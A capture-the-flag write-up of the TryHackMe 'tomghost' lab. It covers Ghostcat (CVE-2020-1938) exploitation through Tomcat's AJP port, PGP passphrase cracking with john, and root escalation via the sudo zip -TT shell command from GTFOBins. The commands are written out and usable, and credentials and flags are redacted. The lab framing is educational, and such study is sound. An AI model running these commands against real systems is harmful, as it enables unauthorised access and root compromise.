# tomghost — TryHackMe (Easy, Linux)

> Tomcat/AJP → GhostCat (CVE-2020-1938) → SSH → PGP key cracking → user pivot → sudo `zip` → root

**Difficulty:** Easy
**OS:** Linux (Ubuntu 16.04)
**Skills:** AJP enumeration, Ghostcat file read, PoC adaptation (Python 2→3), PGP passphrase cracking, GTFOBins sudo abuse

---

## 1. Enumeration

```bash
nmap -sC -sV -p- $IP
```

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 7.2p2 |
| 53   | tcpwrapped | — |
| 8009 | AJP13   | Apache Jserv (Protocol v1.3) |
| 8080 | HTTP    | Apache Tomcat 9.0.30 |

Port **8009 (AJP)** next to a Tomcat server is the signal. AJP + Tomcat ≤ a vulnerable version points straight at **Ghostcat**.

---

## 2. Foothold — Ghostcat (CVE-2020-1938)

Ghostcat is an AJP file-read / inclusion flaw: through port 8009 you can read files inside Tomcat's web app, including `WEB-INF/web.xml`, where credentials were left behind.

The public PoC was written for Python 2 and failed on Python 3 — I adapted it:

```python
# self.socket.makefile("rb", bufsize=0)   → removed bufsize
self.stream = self.socket.makefile("rb")

# "".join([d.data for d in data])         → bytes + decode
print((b"".join([d.data for d in data]).decode('utf-8', errors='ignore')))
```

Reading `web.xml` leaked SSH credentials:

```
skyfuck:[REDACTED]
```

```bash
ssh skyfuck@$IP
```

Foothold as **skyfuck**.

---

## 3. User Pivot — PGP Key Cracking

`skyfuck`'s home held two files that belong together:

```
credential.pgp     ← an encrypted credential
tryhackme.asc      ← a passphrase-protected PGP private key
```

The chain: crack the key's passphrase, import it, decrypt the credential.

```bash
# on Kali
gpg2john tryhackme.asc > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# passphrase: [REDACTED]

gpg --import tryhackme.asc
gpg --decrypt credential.pgp    # enter the cracked passphrase
```

The decrypted file revealed **merlin**'s credentials → `su merlin`.

---

## 4. Privilege Escalation — sudo `zip` (GTFOBins)

```bash
sudo -l
```

```
(root : root) NOPASSWD: /usr/bin/zip
```

`zip` as root with no password is a known [GTFOBins](https://gtfobins.github.io/gtfobins/zip/) escalation — its `-TT` test flag runs an arbitrary command:

```bash
sudo zip $(mktemp -u) /etc/hosts -T -TT 'sh #'
```

Dropped into a root shell:

```bash
cat /root/root.txt
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root achieved. Flags redacted.

---

## Lessons Learned / Where I Got Stuck

- **"How long will it take?" was the wrong question.** John ran the tiny default wordlist, failed, and dropped into incremental brute-force — which never ends. The fix was not patience but the right list: `--wordlist=rockyou.txt` cracked it in under a second. *When a crack "won't finish," suspect the command, not the clock.*
- **SUID list was empty — the path was `sudo -l`.** I ran `find / -perm -4000` first, saw nothing unusual, and only then remembered `sudo -l`. Both are first-reflex: run them back to back at the start of privesc.
- **Ghostcat PoC needed Python 2→3 fixes** — the exact same `makefile`/bytes-decode errors I'd already solved on an earlier box. Old knowledge transferred to a new machine.
- **Relative path + missing `cat`.** `cat root/root.txt` looked in the wrong directory; `/root/root.txt` alone tried to *execute* the file. The flag reads with `cat /root/root.txt` — absolute path, `cat` in front.

---

## Attack Chain Summary

```
nmap → 8009 AJP + 8080 Tomcat 9.0.30 → Ghostcat (CVE-2020-1938)
  → read WEB-INF/web.xml → skyfuck SSH creds → SSH foothold
  → credential.pgp + tryhackme.asc → gpg2john + john (rockyou)
  → gpg import + decrypt → merlin creds → su merlin
  → sudo -l → zip NOPASSWD → GTFOBins (zip -TT) → root
```
